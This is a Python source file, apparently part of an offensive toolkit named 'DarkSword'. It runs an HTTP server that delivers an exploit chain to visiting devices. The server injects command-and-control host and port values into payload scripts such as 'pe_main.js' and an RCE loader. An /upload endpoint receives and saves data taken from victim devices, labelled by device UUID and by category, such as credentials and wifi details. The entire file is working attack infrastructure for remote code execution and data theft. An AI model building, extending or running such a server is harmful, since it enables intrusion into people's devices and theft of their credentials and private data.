"""HTTP server for DarkSword exploit chain delivery."""

import base64
import json
import re
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse
from typing import Optional

from .config import get_payloads_dir, get_templates_dir, ServeConfig

EXFIL_DIR: Optional[Path] = None


class DarkSwordHandler(SimpleHTTPRequestHandler):
    """Custom request handler for serving exploit chain with logging."""

    config: Optional[ServeConfig] = None
    payloads_dir: Path = get_payloads_dir()
    templates_dir: Path = get_templates_dir()

    def __init__(self, *args, directory: Optional[Path] = None, **kwargs):
        self.base_directory = directory or self.payloads_dir
        super().__init__(*args, directory=str(self.base_directory), **kwargs)

    def log_message(self, format: str, *args) -> None:
        """Override to use rich formatting and log all requests."""
        msg = format % args
        if "favicon" not in msg.lower():
            print(f"  [REQUEST] {msg}")

    def end_headers(self) -> None:
        """Add CORS and security headers for exploit delivery."""
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        super().end_headers()

    def _get_c2_host_port(self) -> tuple:
        config = self.config or getattr(self, "config", None)
        host = "localhost"
        port = str(config.port) if config else "8080"
        if config and config.custom_host_in_loader:
            url = config.custom_host_in_loader
            if "://" in url:
                url = url.split("://", 1)[1]
            if "/" in url:
                url = url.split("/", 1)[0]
            if ":" in url:
                host, port = url.rsplit(":", 1)
            else:
                host = url
        else:
            host_header = self.headers.get("Host", "")
            if ":" in host_header:
                host, port = host_header.rsplit(":", 1)
            else:
                host = host_header
        return host, port

    def _infer_local_host_from_request(self) -> Optional[str]:
        """Base URL for worker getJS when --c2-host is not set (uses Host from this request)."""
        host_header = (self.headers.get("Host") or "").strip()
        if not host_header:
            return None
        return f"http://{host_header}"

    def _inject_c2_into_pe_main(self, content: bytes, path: Path) -> bytes:
        if path.name != "pe_main.js" or b"__DS_C2" not in content:
            return content
        config = self.config
        if not config:
            return content
        host, port = self._get_c2_host_port()
        content_str = content.decode("utf-8", errors="replace")
        content_str = content_str.replace("__DS_C2_HOST__", host)
        content_str = content_str.replace("__DS_C2_PORT__", port)
        content_str = content_str.replace("__DS_C2_HTTPS__", "false")
        return content_str.encode("utf-8")

    def serve_file(self, path: Path, content_type: str = "application/octet-stream") -> bool:
        """Serve a file with optional content type."""
        try:
            with open(path, "rb") as f:
                content = f.read()

            if path.name == "pe_main.js":
                content = self._inject_c2_into_pe_main(content, path)
            elif path.suffix == ".js":
                content_str = content.decode("utf-8", errors="replace")
                if "var localHost" in content_str:
                    cfg = self.config
                    local_url = None
                    if cfg and cfg.custom_host_in_loader:
                        local_url = cfg.custom_host_in_loader
                    else:
                        local_url = self._infer_local_host_from_request()
                    if local_url:
                        content_str = re.sub(
                            r'var localHost\s*=\s*"[^"]*"',
                            f'var localHost = "{local_url}"',
                            content_str,
                        )
                        content = content_str.encode("utf-8")

            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
            return True
        except Exception as e:
            print(f"  [ERROR] Failed to serve {path}: {e}")
            return False

    def do_GET(self) -> None:
        """Handle GET requests - serve from payloads or templates."""
        parsed = urlparse(self.path)
        # Workers POST debug lines via sync XHR; missing file caused 404 and unstable chains.
        norm_log = parsed.path.rstrip("/") or "/"
        if norm_log == "/log.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"OK")
            return

        path = parsed.path.strip("/") or "index.html"
        if ".." in path:
            self.send_error(403, "Forbidden")
            return

        for base in [self.payloads_dir, self.templates_dir]:
            file_path = (base / path).resolve()
            if not str(file_path).startswith(str(base.resolve())):
                continue
            if file_path.exists() and file_path.is_file():
                break
        else:
            file_path = None

        if file_path and file_path.exists() and file_path.is_file():
            suffix = file_path.suffix.lower()
            content_types = {
                ".html": "text/html",
                ".js": "application/javascript",
                ".css": "text/css",
                ".json": "application/json",
            }
            content_type = content_types.get(suffix, "application/octet-stream")
            if self.serve_file(file_path, content_type):
                return

        super().do_GET()

    def do_POST(self) -> None:
        """Handle POST - /upload receives exfiltrated data from payload."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        parsed = urlparse(self.path)
        if parsed.path.strip("/") == "upload":
            self._handle_upload(body)
            return
        print(f"  [POST] {self.path} ({content_length} bytes)")
        self.send_response(404)
        self.end_headers()

    def _handle_upload(self, body: bytes) -> None:
        try:
            data = json.loads(body.decode("utf-8"))
            device = data.get("deviceUUID", "unknown")
            category = data.get("category", "data")
            path = data.get("path", "unknown")
            desc = data.get("description", "")
            b64 = data.get("data", "")
            if b64:
                raw = base64.b64decode(b64)
                exfil_dir = EXFIL_DIR or (get_payloads_dir().parent / "exfil")
                exfil_dir.mkdir(parents=True, exist_ok=True)
                safe_device = re.sub(r'[^\w\-]', '_', device)[:64]
                ext = ".txt" if "credential" in category.lower() or "wifi" in str(desc).lower() else ".bin"
                fname = f"{safe_device}_{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                out_path = exfil_dir / fname
                out_path.write_bytes(raw)
                print(f"  [EXFIL] {device} | {category} | {path} -> {out_path}")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
        except Exception as e:
            print(f"  [UPLOAD ERROR] {e}")
            self.send_response(500)
            self.end_headers()


def run_server(config: ServeConfig) -> None:
    """Start the exploit delivery HTTP server."""
    DarkSwordHandler.config = config
    DarkSwordHandler.payloads_dir = get_payloads_dir()
    DarkSwordHandler.templates_dir = get_templates_dir()

    server = HTTPServer((config.host, config.port), DarkSwordHandler)
    print(f"\n[*] DarkSword server listening on http://{config.host}:{config.port}")
    print(f"[*] Payloads: {get_payloads_dir()}")
    print(f"[*] Access: http://localhost:{config.port}/ or http://<IP>:{config.port}/")
    if not config.custom_host_in_loader:
        print(
            "[*] rce_loader localHost: auto from each request Host (http). "
            "Use --c2-host https://... if you need HTTPS or a public URL."
        )
    exfil_dir = get_payloads_dir().parent / "exfil"
    print(f"[*] Exfil data saved to: {exfil_dir}")
    print("\n[!] Press Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
        server.shutdown()
